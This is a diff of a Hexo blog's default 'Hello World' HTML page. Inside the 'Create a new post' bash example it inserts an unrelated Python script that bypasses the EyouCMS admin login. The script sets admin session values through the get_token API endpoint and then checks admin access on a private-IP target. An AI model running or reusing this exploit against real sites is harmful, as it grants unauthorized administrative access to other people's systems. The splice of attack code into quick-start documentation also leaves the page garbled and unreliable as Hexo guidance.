@@ -542,6 +542,89 @@
             <div id="articleContent">
                 <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
+from <span class="token function">time</span> <span class="token function">import</span> time,sleep
+<span class="token function">import</span> requests
+<span class="token function">import</span> sys
+
+class EyouCMS:
+    def __init__<span class="token punctuation">(</span>self,URL<span class="token punctuation">)</span>:
+        self.Req <span class="token operator">=</span> requests.session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self.URL <span class="token operator">=</span> URL
+        self.SleepTime <span class="token operator">=</span> 0.5
+        self.AdminURL <span class="token operator">=</span> <span class="token string">'login.php?m=admin&amp;c=Admin&amp;a=admin_edit&amp;id=1&amp;lang=cn'</span>
+        self.Payload <span class="token operator">=</span> <span class="token string">'index.php/?m=api&amp;c=ajax&amp;a=get_token&amp;name='</span>
+        self.admin_id <span class="token operator">=</span> <span class="token string">'admin_id'</span>
+        self.admin_login_expire <span class="token operator">=</span> <span class="token string">'admin_login_expire'</span>
+        self.admin_info_role_id <span class="token operator">=</span> <span class="token string">'admin_info.role_id'</span>
+        self.Headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+            <span class="token string">'x-requested-with'</span><span class="token keyword">:</span> <span class="token string">'XMLHttpRequest'</span>,
+        <span class="token punctuation">}</span>
+
+    def Banner<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        print<span class="token punctuation">(</span><span class="token string">"-"</span>*10 + <span class="token string">"后台登录绕过"</span> + <span class="token string">"-"</span>*10<span class="token punctuation">)</span>
+
+
+    def change<span class="token punctuation">(</span>self,string<span class="token punctuation">)</span>:
+        temp <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> n, s <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>string<span class="token punctuation">)</span>:
+            <span class="token keyword">if</span> n <span class="token operator">==</span> 0:
+                <span class="token keyword">if</span> s.isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+                    <span class="token keyword">return</span> <span class="token string">'0'</span>
+                    <span class="token keyword">break</span>
+            <span class="token keyword">if</span> s.isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+                temp +<span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+            else:
+                <span class="token keyword">if</span> s.isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+                    <span class="token keyword">break</span>
+        <span class="token keyword">return</span> temp
+
+    def SetID<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        res <span class="token operator">=</span> self.Req.get<span class="token punctuation">(</span>self.URL + self.Payload + self.admin_id, headers<span class="token operator">=</span>self.Headers<span class="token punctuation">)</span>
+        print<span class="token punctuation">(</span><span class="token string">"admin_id[+]:\t\t\t\t\t"</span> + res.text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'Set-cookie'</span> <span class="token keyword">in</span> res.headers:
+            print<span class="token punctuation">(</span>res.headers<span class="token punctuation">[</span><span class="token string">'set-cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> res.status_code <span class="token operator">!=</span> 200:
+            sys.exit<span class="token punctuation">(</span><span class="token string">"Api模块请求404"</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(res.headers)</span>
+
+    def SetExpire<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        <span class="token keyword">while</span> True:
+            res <span class="token operator">=</span> self.Req.get<span class="token punctuation">(</span>self.URL + self.Payload + self.admin_login_expire, headers<span class="token operator">=</span>self.Headers<span class="token punctuation">)</span>
+           <span class="token comment" spellcheck="true"># print(res.text,end='\t\t\t\t')</span>
+           <span class="token comment" spellcheck="true"># print(self.change(res.text))</span>
+            if<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>-int<span class="token punctuation">(</span>self.change<span class="token punctuation">(</span>res.text<span class="token punctuation">)</span>,10<span class="token punctuation">)</span><span class="token operator">&lt;</span>3600<span class="token punctuation">)</span>:
+                print<span class="token punctuation">(</span><span class="token string">"admin_login_expire[+]:\t\t\t"</span> + res.text<span class="token punctuation">)</span>
+                <span class="token comment" spellcheck="true"># print(res.headers)</span>
+                <span class="token keyword">break</span>
+            sleep<span class="token punctuation">(</span>self.SleepTime<span class="token punctuation">)</span>
+
+    def SetRoleID<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        <span class="token keyword">while</span> True:
+            res <span class="token operator">=</span> self.Req.get<span class="token punctuation">(</span>self.URL + self.Payload + self.admin_info_role_id, headers<span class="token operator">=</span>self.Headers<span class="token punctuation">)</span>
+            if<span class="token punctuation">(</span>int<span class="token punctuation">(</span>self.change<span class="token punctuation">(</span>res.text<span class="token punctuation">)</span>,10<span class="token punctuation">)</span><span class="token operator">&lt;=</span>0<span class="token punctuation">)</span>:
+                print<span class="token punctuation">(</span><span class="token string">"admin_info.rele_id[+]:\t\t\t"</span> + res.text<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+            sleep<span class="token punctuation">(</span>self.SleepTime<span class="token punctuation">)</span>
+
+    def CheckLogin<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        res <span class="token operator">=</span> self.Req.get<span class="token punctuation">(</span>self.URL + self.AdminURL, headers<span class="token operator">=</span>self.Headers<span class="token punctuation">)</span>
+        res.encoding <span class="token operator">=</span> res.apparent_encoding
+        <span class="token keyword">if</span> <span class="token string">'更换头像'</span> <span class="token keyword">in</span> res.text:
+            print<span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span>
+
+    def run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:
+        self.SetID<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self.SetExpire<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self.SetRoleID<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self.CheckLogin<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token keyword">:</span>
+    Start <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    URL <span class="token operator">=</span> <span class="token string">'http://10.12.246.7:20080/'</span>
+    e <span class="token operator">=</span> EyouCMS<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>
+    e.run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    End <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    print<span class="token punctuation">(</span>End-Start<span class="token punctuation">)</span>
 </code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
 <h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
